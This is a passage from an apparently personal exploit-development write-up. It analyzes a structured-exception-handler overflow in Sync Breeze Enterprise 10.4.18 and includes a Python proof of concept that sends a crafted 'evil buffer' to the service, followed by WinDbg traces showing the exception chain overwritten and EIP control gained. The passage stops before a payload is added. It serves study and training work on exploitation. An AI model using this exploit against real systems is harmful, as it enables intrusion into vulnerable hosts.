style=\"color:#ae81ff\"\u003e\\x00\\x40\\x00\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e header \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e pack(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;I\u0026#39;\u003c/span\u003e, len(inputBuffer))  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e header \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e pack(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;I\u0026#39;\u003c/span\u003e, len(inputBuffer))  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e header \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e pack(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;I\u0026#39;\u003c/span\u003e, inputBuffer[\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e])  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e buf \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e header \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e inputBuffer  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Sending evil buffer...\u0026#34;\u003c/span\u003e)  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e s \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e socket\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esocket(socket\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eAF_INET, socket\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eSOCK_STREAM)  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econnect((server, port))  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(buf)  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eclose()  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Done!\u0026#34;\u003c/span\u003e)  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e socket\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eerror:  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Could not connect!\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWhen we execute the exploit, we see that the EAX register is overwritten, but not the EIP\u0026hellip;\nSeems like at this moment the EIP register is not directly under our control.\nAlso, there is some data in the stack that contains part of our payload:\n\u003cimg src=\"content/images/post_images/osed_2.png\" alt=\"\"\u003e\u003c/p\u003e","tags":[],"text":"analyzing public exploit vulnerable binary: sync breeze enterprise v10.4.18 let\u0026rsquo;s try to use the public exploit to trigger a crash:\n#!/usr/bin/python import socket import sys from struct import pack try: server = \u0026#34;192.168.122.113\u0026#34; port = 9121 size = 1000 inputbuffer = b\u0026#34;\\x41\u0026#34; * size header = b\u0026#34;\\x75\\x19\\xba\\xab\u0026#34; header += b\u0026#34;\\x03\\x00\\x00\\x00\u0026#34; header += b\u0026#34;\\x00\\x40\\x00\\x00\u0026#34; header += pack(\u0026#39;\u0026lt;i\u0026#39;, len(inputbuffer)) header += pack(\u0026#39;\u0026lt;i\u0026#39;, len(inputbuffer)) header += pack(\u0026#39;\u0026lt;i\u0026#39;, inputbuffer[-1]) buf = header + inputbuffer print(\u0026#34;sending evil buffer...\u0026#34;) s = socket.socket(socket.af_inet, socket.sock_stream) s.connect((server, port)) s.send(buf) s.close() print(\u0026#34;done!\u0026#34;) except socket.error: print(\u0026#34;could not connect!\u0026#34;) when we execute the exploit, we see that the eax register is overwritten, but not the eip\u0026hellip; seems like at this moment the eip register is not directly under our control. also, there is some data in the stack that contains part of our payload: let\u0026rsquo;s see all the registers and confirm that eax is the only register under our control: let\u0026rsquo;s examine the crash. the crash says:\n(113c.1164): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. this means that the debugger intercepted a first chance exception, which is like a unexpected error. let\u0026rsquo;s handle it continuing the program by pressing \u0026ldquo;g\u0026rdquo;. we can see that we got another access violation, now controlling the eip. to understand how this exploit worked and how we got control over the eip, we have to talk about the seh.\nseh we must understand what happens when an exception occurs inside an application. as mentioned in the previous section, exceptions are unexpected events that occur during normal program execution. there are two kinds of exceptions: hardware exceptions and software exceptions.\nhardware exceptions are initiated by the cpu. we encountered a typical hardware exception when our script crashed the sync breeze service as the cpu attempted to dereference an invalid memory address. hardware exceptions are exceptions that are not made by the programmer, but occur when the logic in the assembly code fails. on the other hand, software exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. for example, a software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument. they are exceptions but controlled in the software layer. normally the exception handling is programmed via try/except blocks. in windows, when doing a try/except block, the code will leverage the seh (structure exception handling) implemented by the windows os to handle the unexpected event.\nseh is implemented in the operative system (windows) to manage what to do when an unexpected action occurs in the execution of a thread. when a thread faults, the os calls a set of functions, called function handlers, which can correct the exception, provide more information about the unexpected condition, etc. the exception handlers are user-defined and created during the creation of the try/except code blocks. so, the seh is the mechanism created by the os that executes our exception handlers (created by developers) when an exception fails. important note: there is a special default exception handler which is defined by the os, the rest are programmed by the developer.\nwhen an unexpected event occurs, the os must locates the correct exception handler. note that the exception handling occurs at a thread level. each thread in a program can be identified by a teb (thread environment block) structure, a struct that stores important information about such thread. each time a try block is found during the execution of a thread, a pointer to the corresponding exception handler is saved on the stack in the _exception_registration_record structure. as there might be different try blocks chained in the single thread (a try inside a try), these structures are connected in the stack in a linked list, as the following image details: in the case that the exception occurs, the os inspects the teb structure of the thread that has the exception and retrieves a pointer (exceptionlist) to the linked list of _exception_registration_record. how does the os retrieves information of the teb? well, the fs register at offset 0 (fs:[0]) stores a pointer to the teb structure of that thread. after retrieving the exception list, the os will walk and invoke each of the exception handler functions stored in the stack until one of them can deal with the unexpected event. if none of the defined functions can handle the exception, the os invokes the default exception handler, which is always the last node in the linked list. this exception handler terminates the current process (or thread if the application is a system service).\ntl; dr, the teb of a thread has a pointer called exceptionlist that points to the linked list of _exception_registration_record in the stack. the pointer is to the first exception, as the rest are chained by following the \u0026ldquo;next\u0026rdquo; attribute of the exception. each of these handlers is called to manage the exception when it occurs. if none of then can manage the exception, the program exits or the thread ends, in case of a service.\nseh internals let\u0026rsquo;s analyze the teb structure:\n0:009\u0026gt; dt nt!_teb ntdll!_teb +0x000 nttib : _nt_tib +0x01c environmentpointer : ptr32 void +0x020 clientid : _client_id +0x028 activerpchandle : ptr32 void +0x02c threadlocalstoragepointer : ptr32 void +0x030 processenvironmentblock : ptr32 _peb +0x034 lasterrorvalue : uint4b +0x038 countofownedcriticalsections : uint4b +0x03c csrclientthread : ptr32 void +0x040 win32threadinfo : ptr32 void +0x044 user32reserved : [26] uint4b +0x0ac userreserved : [5] uint4b +0x0c0 wow32reserved : ptr32 void +0x0c4 currentlocale : uint4b +0x0c8 fpsoftwarestatusregister : uint4b +0x0cc reservedfordebuggerinstrumentation : [16] ptr32 void +0x10c systemreserved1 : [26] ptr32 void +0x174 placeholdercompatibilitymode : char +0x175 placeholderhydrationalwaysexplicit : uchar +0x176 placeholderreserved : [10] char +0x180 proxiedprocessid : uint4b +0x184 _activationstack : _activation_context_stack +0x19c workingonbehalfticket : [8] uchar +0x1a4 exceptioncode : int4b +0x1a8 activationcontextstackpointer : ptr32 _activation_context_stack +0x1ac instrumentationcallbacksp : uint4b +0x1b0 instrumentationcallbackpreviouspc : uint4b +0x1b4 instrumentationcallbackprevioussp : uint4b +0x1b8 instrumentationcallbackdisabled : uchar +0x1b9 sparebytes : [23] uchar +0x1d0 txfscontext : uint4b +0x1d4 gditebbatch : _gdi_teb_batch +0x6b4 realclientid : _client_id +0x6bc gdicachedprocesshandle : ptr32 void +0x6c0 gdiclientpid : uint4b +0x6c4 gdiclienttid : uint4b +0x6c8 gdithreadlocalinfo : ptr32 void +0x6cc win32clientinfo : [62] uint4b +0x7c4 gldispatchtable : [233] ptr32 void +0xb68 glreserved1 : [29] uint4b +0xbdc glreserved2 : ptr32 void +0xbe0 glsectioninfo : ptr32 void +0xbe4 glsection : ptr32 void +0xbe8 gltable : ptr32 void +0xbec glcurrentrc : ptr32 void +0xbf0 glcontext : ptr32 void +0xbf4 laststatusvalue : uint4b +0xbf8 staticunicodestring : _unicode_string +0xc00 staticunicodebuffer : [261] wchar +0xe0c deallocationstack : ptr32 void +0xe10 tlsslots : [64] ptr32 void +0xf10 tlslinks : _list_entry +0xf18 vdm : ptr32 void +0xf1c reservedforntrpc : ptr32 void +0xf20 dbgssreserved : [2] ptr32 void +0xf28 harderrormode : uint4b +0xf2c instrumentation : [9] ptr32 void +0xf50 activityid : _guid +0xf60 subprocesstag : ptr32 void +0xf64 perflibdata : ptr32 void +0xf68 etwtracedata : ptr32 void +0xf6c winsockdata : ptr32 void +0xf70 gdibatchcount : uint4b +0xf74 currentidealprocessor : _processor_number +0xf74 idealprocessorvalue : uint4b +0xf74 reservedpad0 : uchar +0xf75 reservedpad1 : uchar +0xf76 reservedpad2 : uchar +0xf77 idealprocessor : uchar +0xf78 guaranteedstackbytes : uint4b +0xf7c reservedforperf : ptr32 void +0xf80 reservedforole : ptr32 void +0xf84 waitingonloaderlock : uint4b +0xf88 savedprioritystate : ptr32 void +0xf8c reservedforcodecoverage : uint4b +0xf90 threadpooldata : ptr32 void +0xf94 tlsexpansionslots : ptr32 ptr32 void +0xf98 muigeneration : uint4b +0xf9c isimpersonating : uint4b +0xfa0 nlscache : ptr32 void +0xfa4 pshimdata : ptr32 void +0xfa8 heapdata : uint4b +0xfac currenttransactionhandle : ptr32 void +0xfb0 activeframe : ptr32 _teb_active_frame +0xfb4 flsdata : ptr32 void +0xfb8 preferredlanguages : ptr32 void +0xfbc userpreflanguages : ptr32 void +0xfc0 mergedpreflanguages : ptr32 void +0xfc4 muiimpersonation : uint4b +0xfc8 crosstebflags : uint2b +0xfc8 sparecrosstebbits : pos 0, 16 bits +0xfca sametebflags : uint2b +0xfca safethunkcall : pos 0, 1 bit +0xfca indebugprint : pos 1, 1 bit +0xfca hasfiberdata : pos 2, 1 bit +0xfca skipthreadattach : pos 3, 1 bit +0xfca werinshipassertcode : pos 4, 1 bit +0xfca ranprocessinit : pos 5, 1 bit +0xfca clonedthread : pos 6, 1 bit +0xfca suppressdebugmsg : pos 7, 1 bit +0xfca disableuserstackwalk : pos 8, 1 bit +0xfca rtlexceptionattached : pos 9, 1 bit +0xfca initialthread : pos 10, 1 bit +0xfca sessionaware : pos 11, 1 bit +0xfca loadowner : pos 12, 1 bit +0xfca loaderworker : pos 13, 1 bit +0xfca skiploaderinit : pos 14, 1 bit +0xfca sparesametebbits : pos 15, 1 bit +0xfcc txnscopeentercallback : ptr32 void +0xfd0 txnscopeexitcallback : ptr32 void +0xfd4 txnscopecontext : ptr32 void +0xfd8 lockcount : uint4b +0xfdc wowteboffset : int4b +0xfe0 resourceretvalue : ptr32 void +0xfe4 reservedforwdf : ptr32 void +0xfe8 reservedforcrt : uint8b +0xff0 effectivecontainerid : _guid inside this structure, at offset 0x0, there is the _nt_tib structure. let\u0026rsquo;s analyze it.\n0:009\u0026gt; dt _nt_tib ntdll!_nt_tib +0x000 exceptionlist : ptr32 _exception_registration_record +0x004 stackbase : ptr32 void +0x008 stacklimit : ptr32 void +0x00c subsystemtib : ptr32 void +0x010 fiberdata : ptr32 void +0x010 version : uint4b +0x014 arbitraryuserpointer : ptr32 void +0x018 self : ptr32 _nt_tib we have the pointer called exceptionlist which points at a _exception_registration_record structure. let\u0026rsquo;s analyze this structure:\n0:009\u0026gt; dt _exception_registration_record ntdll!_exception_registration_record +0x000 next : ptr32 _exception_registration_record +0x004 handler : ptr32 _exception_disposition we can see that this structure has a pointer to another _exception_registration_record structure and a pointer to the handler of this record. the handler parameter points to a callback function called _except_handler which returns a _exception_disposition structure. let\u0026rsquo;s see the _except_handler function prototype (not implementation, only parameters):\ntypedef exception_disposition _except_handler (*pexception_routine) ( in pexception_record exceptionrecord, in void establisherframe, in out pcontext contextrecord, in out pdispatcher_context dispatchercontext ); the _except_handler function can have different names depending on the os (e.g, it is also called ntdll!_except_handler4). depending on the symbols provided for each version of windows, it changes. however, the parameters and return value of the function are always the same.\nnote that this is the function that gets executed to manage the exception! this is the important thing to know.\nwe are interested on the second and third parameters of the exception_disposition structure. these parameters are establisherframe and contextrecord.\nestablisherframe points to the _exception_registration_record structure, which is used to handle the exception. contextrecord is a pointer to a context structure, which contains processor-specific register data at the time the exception was raised. let\u0026rsquo;s analyze the context structure in windbg. we can see that it contains many fields and also the states of all of our registers, including the eip:\n0:009\u0026gt; dt _context ntdll!_context +0x000 contextflags : uint4b +0x004 dr0 : uint4b +0x008 dr1 : uint4b +0x00c dr2 : uint4b +0x010 dr3 : uint4b +0x014 dr6 : uint4b +0x018 dr7 : uint4b +0x01c floatsave : _floating_save_area +0x08c seggs : uint4b +0x090 segfs : uint4b +0x094 seges : uint4b +0x098 segds : uint4b +0x09c edi : uint4b +0x0a0 esi : uint4b +0x0a4 ebx : uint4b +0x0a8 edx : uint4b +0x0ac ecx : uint4b +0x0b0 eax : uint4b +0x0b4 ebp : uint4b +0x0b8 eip : uint4b +0x0bc segcs : uint4b +0x0c0 eflags : uint4b +0x0c4 esp : uint4b +0x0c8 segss : uint4b +0x0cc extendedregisters : [512] uchar when the exception is handled, this context information will be used to restore the execution flow after handling the exception, reverting the register information, etc. in case that any register is modified during the exception, this is like a wayback machine.\nas mentioned earlier, the _except_handler function returns a _exception_dispositionstructure. if we inspect this structure, we can see that it contains the result of the exception handling process:\n0:009\u0026gt; dt _exception_disposition ntdll!_exception_disposition exceptioncontinueexecution = 0n0 exceptioncontinuesearch = 0n1 exceptionnestedexception = 0n2 exceptioncollidedunwind = 0n3 if the exception handler invoked by the os is not valid for dealing with the exception, the return value will be exceptioncontinuesearch. this results in inspecting the \u0026ldquo;next\u0026rdquo; pointer of the structure to move on to the next _exception_registration_record structure in the linked list. in the case that this handler is valid to handle the exception, it will return exceptioncontinueexecution, meaning that the execution can continue.\nthis is a diagram that details the process of seh, as we have explained previously. basically consists in:\ngetting teb address. accessing 0x0 of teb to get nt_tib accessing 0x0 of nt_tib to get a pointer to the first _exception_registration_record of the stack. try to execute the associated _except_handler of such _exception_registration_record. depending on the _exception_disposition return value of the function, navigate to the next _exception_registration_record of the stack to keep managing the exception, or continue with the execution: now, let\u0026rsquo;s see in details how the os calls the exception handler functions and what checks are performed before invoking them. when an exception is found, ntdll!kiuserexceptiondispatcher is called. this function is the responsible for dispatching exceptions on windows os. the function takes two arguments:\na _exception_record structure, that contains information about the exception. a context structure, with information about the running context of the thread (e.g., registers). eventually this function will call the rtldispatchexception , which will retrieve the teb and proceed to parse the exceptionlist through the mechanism already explained. during the process of going through all the exceptions, for each handler member in the list, the os will ensure that the _exception_registration_record structure falls within the stack memory limits found in the teb. also, more checks to the exception handler function are performed usng the rtlisvalidhandler function.\nrtlisvalidhandler is the responsible for the safeseh implementation. this is a mitigation introduced by microsoft to prevent an attacker from gaining control of the execution flow after overwriting a stack-based exception handler. at a high level, if a module is compiled with the safeseh flag, the linker will produce an image containing a table of safe exception handlers. the operating system will then validate the exception_handler on the stack by comparing it to the entries in the table of safe exception handlers. if the handler is not found, the system will refuse to execute it.\nunfortunately, the source code for rtlisvalidhandler is not publicly available, so we must instead analyze the pseudo-code that was generated by security researchers after reverse engineering this function on windows 8.1. this code will be similar to what the windows 10 os does, so we can analyze it:\nbool rtlisvalidhandler(handler) // nt 6.3.9600 { if (/* handler within the image */) { if (dllcharacteristics-\u0026gt;image_dllcharacteristics_no_seh) goto invalidhandler; if (/* the image is .net assembly, \u0026#39;ilonly\u0026#39; flag is enabled */) goto invalidhandler; if (/* found \u0026#39;safeseh\u0026#39; table */) { if (/* the image is registered in \u0026#39;ldrpinvertedfunctiontable\u0026#39; (or its cache), or the initialization of the process is not complete */) { if (/* handler found in \u0026#39;safeseh\u0026#39; table */) return true; else goto invalidhandler; } return true; } else { if (/* \u0026#39;executedispatchenable\u0026#39; and \u0026#39;imagedispatchenable\u0026#39; flags are enabled in \u0026#39;executeoptions\u0026#39; of the process */) return true; if (/* handler is in non-executable area of the memory */) { if (executedispatchenable) return true; } else if (imagedispatchenable) return true; } invalidhandler: rtlinvalidhandlerdetected(...); return false; }\tby seeing the code, we can see that the functions checks the dllcharacteristics of the specific module where the exception occurs. if the module is compiled with safeseh, the handler function will be compared against the entries of the table of the safeseh handlers before it is executed. if the function succeeds, validating the handler, the os will call rtlpexecutehandlerforexception. this function will set up the appropiate arguments and invoke executehandler, which will end executing the _except_handler function. this process is done for each of the handlers, to validate each of them.\nto enable this functionality in a binary, the binary must be compiled with the /safeseh flag.\nin summary, whenever an exception occurs, the operating system calls a designated set of functions as part of the seh mechanism. within these function calls, the exceptionlist singlelinked list is gathered from the teb structure. next, the operating system parses the singly-linked list of _exception_registration_record structures, performing various checks before calling the exception_handler function pointed to by each handler member. this continues until a handler is found that will successfully process the exception and allow execution to continue. if no handler can successfully handle the exception, the application will crash.\nseh overflows a seh overflow is a stack based buffer overflow that is large enough or positioned in such a way that it is possible to overwrite valid registered exception handlers on the stack. by overwriting these handlers, the attacker can take control of the instruction pointer after triggering an exception.\nthis type of overflow bypasses the gs flag (stack cookies) as these cookies are positioned next to the return value of the vulnerable function. with this attack, the exception handler is modified and the instruction pointer is redirected to the address of the exception handler prior to reaching the end of the vulnerable function (in which the check is performed).\nnote: as the _exception_registration_record structures (the ones we want to modify) are stored at the beginning of the stack space (high addresses), the overflow needs to be quite large or begin near the beginning of the stack in order for the attacker to overwrite a structured exception handler.\nlet\u0026rsquo;s inspect our chain of _exception_registration_recordsin our victim process without tampering it first. because the seh mechanism works on a per-thread basis, we won’t be able to inspect the intact seh chain for the thread handling our incoming data, as that thread has not yet spawned. instead, we will inspect the chain of p _exception_registration_record structures for the thread windbg breaks into when we attach the debugger to the target process. this will reveal an intact chain.\nlet\u0026rsquo;s use the \u0026ldquo;teb\u0026rdquo; command in windbg to display the teb address. we can see that we hace the exceptionlist pointer:\n0:008\u0026gt; !teb teb at 003db000 exceptionlist: 00a0ff60 stackbase: 00a10000 stacklimit: 00a0c000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 003db000 environmentpointer: 00000000 clientid: 00000938 . 000018f8 rpchandle: 00000000 tls storage: 00000000 peb address: 003c9000 lasterrorvalue: 0 laststatusvalue: 0 count owned locks: 0 harderrormode: 0 we see that it is near 0x0, which means that it is close to the base of the stack of the thread. let\u0026rsquo;s dump the first _exception_registration_record structure at the memory address of the exceptionlist pointer. from the previous section, we know that the _exception_registration_record structure has two members. the first is next and, as the name suggests, it points to the next entry in the singly-linked list. the second, handler, is the memory address of the _except_handler function. we can manually walk the singly-linked list in the debugger as shown in the listing below:\n0:008\u0026gt; dt _exception_registration_record 00a0ff60 ntdll!_exception_registration_record +0x000 next : 0x00a0ffcc _exception_registration_record +0x004 handler : 0x77308b10 _exception_disposition ntdll!_except_handler4+0 we can iterate over the \u0026ldquo;next\u0026rdquo; argument to see how much records there are in the stack. let\u0026rsquo;s do it:\n0:008\u0026gt; dt _exception_registration_record 00a0ff60 ntdll!_exception_registration_record +0x000 next : 0x00a0ffcc _exception_registration_record +0x004 handler : 0x77308b10 _exception_disposition ntdll!_except_handler4+0 0:008\u0026gt; dt _exception_registration_record 00a0ffcc ntdll!_exception_registration_record +0x000 next : 0x00a0ffe4 _exception_registration_record +0x004 handler : 0x77308b10 _exception_disposition ntdll!_except_handler4+0 0:008\u0026gt; dt _exception_registration_record 00a0ffe4 ntdll!_exception_registration_record +0x000 next : 0xffffffff _exception_registration_record +0x004 handler : 0x773163cf _exception_disposition ntdll!finalexceptionhandlerpad47+0 we see that the last member of the list has a \u0026ldquo;next\u0026rdquo; pointer to 0xffffffff. this last record is the default exception handler specified by the os, the one that ends the thread or program. note that the associated _exception_disposition value is different from the others!\nnow, let\u0026rsquo;s trigger the crash with the exploit again to see what happens during a seh overflow. once we send the exploit, let\u0026rsquo;s walk the exceptionlist again. oh, wait! the second _exception_registration_record structure has been overwritten by our buffer!\n0:007\u0026gt; dt _exception_registration_record 0090fe0c ntdll!_exception_registration_record +0x000 next : 0x0090ff44 _exception_registration_record +0x004 handler : 0x1008df5b _exception_disposition libpal!md5_starts+0 0:007\u0026gt; dt _exception_registration_record 0090ff44 ntdll!_exception_registration_record +0x000 next : 0x41414141 _exception_registration_record +0x004 handler : 0x41414141 _exception_disposition +41414141 note that _exception_registration_record structures are pushed on the stack from first to last. because of this, seh overflows generally overwrite the last _exception_registration_record structure first, as it is the nearest to reach. keep in mind that in some cases, the overflow happens in such a way that the exception chain is only partially overwritten.\nthe exception occurs because the application is trying to read and execute an unmapped memory page. this causes an access violation exception that needs to be handled by the application or the os.\nlet\u0026rsquo;s display all the exception handlers of the current thread with the !exchain extension:\n0:007\u0026gt; !exchain 0090fe0c: libpal!md5_starts+149fb (1008df5b) 0090ff44: 41414141 invalid exception stack at 41414141 this little program which follows the exception chain tells us the same as our manual analysis: we have managed to overwrite an exception handler.\nfor now, we know that the first step in the seh overflow is to obtain the address of the first _exception_registration_record structure from the teb. then the os proceeds to call each of the _exception_handler functions until the exception has been handled, or crashes if no handler could deal with the exception.\nat this point, however, the address of at least one of the _except_handler functions has been overwritten by our buffer (0x41414141). this means that whenever this _exception_registration_recordstructure is used to handle the exception, the cpu will end up calling 0x41414141, giving us control over the eip register. this is exactly the behavior we noticed as part of the initial crash analysis. note that the previous exceptions need to not be able to manage the exception, so that the exception handling mechanism manages to execute our function in order to try to handle the exception.\nwe can confirm this by resuming execution inserting \u0026ldquo;g\u0026rdquo; in windbg and let the application handle the exception, which leads us to see that eip has been modified to point to our code:\n0:007\u0026gt; g (938.1d54): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. eax=00000000 ebx=00000000 ecx=41414141 edx=77316270 esi=00000000 edi=00000000 eip=41414141 esp=0090f440 ebp=0090f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 41414141 ?? ??? let\u0026rsquo;s inspect the call stack with the \u0026ldquo;k\u0026rdquo; command to see which functions were called before the eip was overwritten:\n0:007\u0026gt; k # childebp retaddr warning: frame ip not in any known module. following frames may be wrong. 00 0090f43c 77316252 0x41414141 01 0090f460 77316224 ntdll!executehandler2+0x26 02 0090f528 77302cb6 ntdll!executehandler+0x24 03 0090f528 10012a9d ntdll!kiuserexceptiondispatcher+0x26 04 0090feb8 00000000 libpal!sca_configobj::deserialize+0x1d the output indicates that ntdll!executehandler2 was called directly before we achieved code execution. as previously discussed, this function is responsible for calling the _except_handler functions registered on the stack. we’ll confirm this shortly.\nokay, we have control over the instruction pointer, but we need to point it to our code. let\u0026rsquo;s see if any of the register points to our buffer. also, let\u0026rsquo;s inspect the stack frame to see if our payload is there:\n0:007\u0026gt; dds esp 0090f440 77316252 ntdll!executehandler2+0x26 0090f444 0090f540 0090f448 0090ff44 0090f44c 0090f55c 0090f450 0090f4cc 0090f454 0090fe0c 0090f458 77316270 ntdll!executehandler2+0x44 0090f45c 0090ff44 0090f460 0090f528 0090f464 77316224 ntdll!executehandler+0x24 0090f468 0090f540 0090f46c 0090ff44 0090f470 0090f55c 0090f474 0090f4cc 0090f478 41414141 0090f47c 0090ff44 0090f480 0090f540 0090f484 00000000 0090f488 772dd4db ntdll!rtldispatchexception+0x143 0090f48c 0090f540 0090f490 0090ff44 0090f494 0090f55c 0090f498 0090f4cc 0090f49c 41414141 0090f4a0 0090fb10 0090f4a4 0090ff08 0090f4a8 0090f540 0090f4ac 00000000 0090f4b0 0090f55c 0090f4b4 0090ff44 0090f4b8 00000032 0090f4bc 0090f000 0:007\u0026gt; r eax=00000000 ebx=00000000 ecx=41414141 edx=77316270 esi=00000000 edi=00000000 eip=41414141 esp=0090f440 ebp=0090f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 41414141 ?? ??? according to the output in listing 107, none of the registers point to our buffer at the moment we gain control over the execution. the ecx register is being overwritten alongside the instruction pointer while most of the other registers are null. we do not overwrite any data on the stack (which esp and ebp point to). lastly, edx appears to point somewhere inside the ntdll!executehandler2 function.\nat this point, even if we control the instruction pointer, we are still not able to easily redirect the execution flow to our buffer where we’d eventually store a payload.\nlet\u0026rsquo;s put a breakpoint in ntdll!executehandler2 to stop the execution before windbg intercepts the exception. then, let\u0026rsquo;s crash the application again, and skip the first call to ntdll!executehandler2, because the first exception handler has not been overwritten by us, and we want to go to the second exception handler.\n(16cc.f30): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. *** warning: unable to verify checksum for c:\\program files\\sync breeze enterprise\\bin\\libpal.dll eax=41414141 ebx=0175fa0c ecx=0175ff08 edx=0175f9c4 esi=0175ff08 edi=0175fb10 eip=008d2a9d esp=0175f998 ebp=0175feb8 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 libpal!sca_configobj::deserialize+0x1d: 008d2a9d ff5024 call dword ptr [eax+24h] ds:0023:41414165=???????? 0:010\u0026gt; bp ntdll!executehandler2 0:010\u0026gt; g breakpoint 0 hit eax=00000000 ebx=00000000 ecx=6fdb73da edx=77316270 esi=00000000 edi=00000000 eip=7731622c esp=0175f464 ebp=0175f528 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!executehandler2: 7731622c 55 push ebp 0:010\u0026gt; g breakpoint 0 hit eax=00000000 ebx=00000000 ecx=6fdb73da edx=77316270 esi=00000000 edi=00000000 eip=7731622c esp=0175f464 ebp=0175f528 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!executehandler2: 7731622c 55 push ebp once the breakpoint to the second exception handler has been triggered, let\u0026rsquo;s inspect eip to see more about this function:\n0:010\u0026gt; u @eip l11 ntdll!executehandler2: 7731622c 55 push ebp 7731622d 8bec mov ebp,esp 7731622f ff750c push dword ptr [ebp+0ch] 77316232 52 push edx 77316233 64ff3500000000 push dword ptr fs:[0] 7731623a 64892500000000 mov dword ptr fs:[0],esp 77316241 ff7514 push dword ptr [ebp+14h] 77316244 ff7510 push dword ptr [ebp+10h] 77316247 ff750c push dword ptr [ebp+0ch] 7731624a ff7508 push dword ptr [ebp+8] 7731624d 8b4d18 mov ecx,dword ptr [ebp+18h] 77316250 ffd1 call ecx // this ends calling 0x41414141, our handler function! 77316252 648b2500000000 mov esp,dword ptr fs:[0] 77316259 648f0500000000 pop dword ptr fs:[0] 77316260 8be5 mov esp,ebp 77316262 5d pop ebp 77316263 c21400 ret 14h the first thing worth mentioning in this code is that we are about to invoke a function by executing a “call ecx” instruction. according to the call stack that we say previously, after the call to executehandler2, we call the overwritten _except_handler function (0x41414141). additionally, this function accepts four arguments as inferred from the four push instructions preceding the “call ecx”. this matches the _except_handler function prototype, which is the following:\ntypedef exception_disposition _except_handler (*pexception_routine) ( in pexception_record exceptionrecord, in void establisherframe, in out pcontext contextrecord, in out pdispatcher_context dispatchercontext ); if we analyze more in depth this function, we can see that the \u0026ldquo;exceptionlist\u0026rdquo; pointer of the teb is being updated with a new _exception_registration_recordstructure, in order to manage exceptions that might occur during the call of the _except_handler function. if we continue the execution of the function, we can see that, after updating the teb, the \u0026ldquo;call\u0026rdquo; instruction is being performed to our controlled address:\n0:010\u0026gt; t eax=00000000 ebx=00000000 ecx=6fdb73da edx=77316270 esi=00000000 edi=00000000 eip=7731624d esp=0175f444 ebp=0175f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!executehandler2+0x21: 7731624d 8b4d18 mov ecx,dword ptr [ebp+18h] ss:0023:0175f478=41414141 0:010\u0026gt; t eax=00000000 ebx=00000000 ecx=41414141 edx=77316270 esi=00000000 edi=00000000 eip=77316250 esp=0175f444 ebp=0175f460 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!executehandler2+0x24: 77316250 ffd1 call ecx {41414141} once we have understood how to redirect code execution, we need to make it point to 